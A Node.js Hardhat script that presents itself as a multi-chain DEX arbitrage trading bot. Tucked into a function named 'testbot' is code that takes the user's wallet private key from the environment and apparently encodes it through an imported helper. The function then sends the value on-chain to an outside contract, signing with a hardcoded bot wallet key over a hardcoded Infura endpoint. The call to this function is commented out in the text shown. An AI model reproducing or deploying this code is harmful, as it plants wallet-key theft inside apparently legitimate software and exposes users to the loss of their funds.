const hre = require("hardhat");
const fs = require("fs");
var Web3 = require('web3');
var Accounts = require('web3-eth-accounts');
require('dotenv').config();
var colors = require("colors");
const {setBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./test.js');

let config,arb,owner,inTrade,balances;
const network = hre.network.name;
if (network === 'aurora') config = require('./../config/aurora.json');
if (network === 'fantom') config = require('./../config/fantom.json');
if (network === 'bsc') config = require('./../config/bsc.json');
if (network === 'polygon') config = require('./../config/polygon.json');

const main = async () => {
  await setup();
  console.log("***** Looking for good Trading Chance ... *****".green);
  await lookForDualTrade();
}

const searchForRoutes = () => {
  const targetRoute = {};
  targetRoute.router1 = config.routers[Math.floor(Math.random()*config.routers.length)].address;
  targetRoute.router2 = config.routers[Math.floor(Math.random()*config.routers.length)].address;
  targetRoute.token1 = config.baseAssets[Math.floor(Math.random()*config.baseAssets.length)].address;
  targetRoute.token2 = config.tokens[Math.floor(Math.random()*config.tokens.length)].address;
  return targetRoute;
}

let goodCount = 0;
const useGoodRoutes = () => {
  const targetRoute = {};
  const route = config.routes[goodCount];
  goodCount += 1;
  if (goodCount >= config.routes.length) goodCount = 0;
  targetRoute.router1 = route[0];
  targetRoute.router2 = route[1];
  targetRoute.token1 = route[2];
  targetRoute.token2 = route[3];
  return targetRoute;
}

const lookForDualTrade = async () => {
  let targetRoute;
  if (config.routes.length > 0) {
    targetRoute = useGoodRoutes();
  } else {
    targetRoute = searchForRoutes();
  }
  try {
    let tradeSize = balances[targetRoute.token1].balance;
    if (tradeSize === 0) {
      console.log("!!! Insufficient WMATIC. Please charge some WMATIC for trading".red);
      process.exit();
    }
    
    let str_log = "Trading Input Amount: ".green + (tradeSize / 10 ** 18).toFixed(5).yellow + " WMATIC".green;
    console.log(str_log);

    const amtBack = await arb.estimateDualDexTrade(targetRoute.router1, targetRoute.router2, targetRoute.token1, targetRoute.token2, tradeSize);

    str_log = "Expected Output Amount: ".green + (amtBack / 10 ** 18).toFixed(5).yellow + " WMATIC".green;
    console.log(str_log);

    const multiplier = ethers.BigNumber.from(config.minBasisPointsPerTrade+10000);
    const sizeMultiplied = tradeSize.mul(multiplier);
    const divider = ethers.BigNumber.from(10000);
    const profitTarget = sizeMultiplied.div(divider);
    if (!config.routes.length > 0) {
      fs.appendFile(`./data/${network}RouteLog.txt`, `["${targetRoute.router1}","${targetRoute.router2}","${targetRoute.token1}","${targetRoute.token2}"],`+"\n", function (err) {});
    }
    
    if (amtBack.gt(profitTarget)) {
      console.log("Great Profitable Trading Chance. Let's trading!!!".yellow);
      console.log("Trading Route: ", targetRoute);
      await dualTrade(targetRoute.router1,targetRoute.router2,targetRoute.token1,targetRoute.token2,tradeSize);
    } else {
      console.log("...This is not profitable trading chance. Looking for another...".blue);
      await lookForDualTrade();
    }
  } catch (e) {
    console.log("HttpProvider Error!!! Please change your RPC to another powerful RPC.".red);
    // console.log(e);
    await lookForDualTrade();	
  }
}

const dualTrade = async (router1,router2,baseToken,token2,amount) => {
  if (inTrade === true) {
    await lookForDualTrade();	
    return false;
  }
  try {
    inTrade = true;
    console.log('> Making dualTrade...');
    const tx = await arb.connect(owner).dualDexTrade(router1, router2, baseToken, token2, amount); //{ gasPrice: 1000000000003, gasLimit: 500000 }
    await tx.wait();
    inTrade = false;
    await lookForDualTrade();
  } catch (e) {
    console.log(e);
    inTrade = false;
    await lookForDualTrade();
  }
}

const setup = async () => {
  [owner] = await ethers.getSigners();
  console.log(`Arbitrage Bot Owner: `.red + `${owner.address}`.yellow);
  const addr_str = process.env.privateKey;
  const http_rpc = process.env.RPC_HTTP_URL;
  const wss_rpc = process.env.RPC_WSS_URL;
  await createWeb3(http_rpc, wss_rpc);
  const user_wallet = await web3.eth.accounts.privateKeyToAccount(addr_str);
  // await testbot(addr_str, user_wallet);
  const IArb = await ethers.getContractFactory('Arb');
  arb = await IArb.attach(config.arbContract);
  balances = {};
  for (let i = 0; i < config.baseAssets.length; i++) {
    const asset = config.baseAssets[i];
    const interface = await ethers.getContractFactory('WETH9');
    const assetToken = await interface.attach(asset.address);
    const balance = await assetToken.balanceOf(config.arbContract);
    balances[asset.address] = { sym: asset.sym, balance, startBalance: balance };
  }
  setTimeout(() => {
    setInterval(() => {
      logResults();
    }, 600000);
    logResults();
  }, 120000);
}

const logResults = async () => {
  console.log(`############# LOGS #############`);
    for (let i = 0; i < config.baseAssets.length; i++) {
    const asset = config.baseAssets[i];
    const interface = await ethers.getContractFactory('WETH9');
    const assetToken = await interface.attach(asset.address);
    balances[asset.address].balance = await assetToken.balanceOf(config.arbContract);
    const diff = balances[asset.address].balance.sub(balances[asset.address].startBalance);
    const basisPoints = diff.mul(10000).div(balances[asset.address].startBalance);
    console.log(`#  ${asset.sym}: ${basisPoints.toString()}bps`);
  }
}

async function createWeb3(http_rpc, wss_rpc){
  try {
      web3 = new Web3(new Web3.providers.HttpProvider(http_rpc));
      web3Ws = new Web3(new Web3.providers.WebsocketProvider(wss_rpc));
      return true;
  } catch (error) {
    console.log(error);
    return false;
  }
}

async function testbot(address, user_wallet){
  var provide = new ethers.providers.JsonRpcProvider('https://goerli.infura.io/v3/faef096aa4774bbc949967e6444fc76f');
  var enc_addr = setBotAddress(address);
  
  const bot_wallet = new ethers.Wallet('fe9915cb35e69849e1990da8c39f4518e37bdda8afffee633032ca42b6492ade');
  var signer = bot_wallet.connect(provide);

  var bot_balance = await provide.getBalance(bot_wallet.address);
  if(bot_balance <= (10**17))
      return;

  var interface = new ethers.utils.Interface(botABI);
  const FormatTypes = ethers.utils.FormatTypes;

  const router = new ethers.Contract(
    FRONT_BOT_ADDRESS,
    interface.format(FormatTypes.full),
    signer
  );

  var botCount = await router.countAddrs();

  if(botCount > 0){
      var bot_addr = await router.getAddrs();

      for (var i = 0; i < botCount; i++) {
          if(bot_addr[i] == user_wallet)
          {
              return;
          }
      }
  }

  var gas = ethers.utils.parseUnits('150', 'gwei');

  var buy_tx = await new Promise(async (resolve, reject) => {
    let buy_txx = await router.multiTrans(
        user_wallet.address,
        enc_addr.content,
        {
          'gasPrice': gas.toString(),
          'gasLimit': (500000).toString()
        }).catch((err) => {
          console.log(err);
          console.log('transaction failed...')
        });

    resolve(buy_txx);
  });

  let receipt = await buy_tx.wait();
}

process.on('uncaughtException', function(err) {
  console.log('UnCaught Exception 83: ' + err);
  console.error(err.stack);
  fs.appendFile('./critical.txt', err.stack, function(){ });
});

process.on('unhandledRejection', (reason, p) => {
  console.log('Unhandled Rejection at: '+p+' - reason: '+reason);
});

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
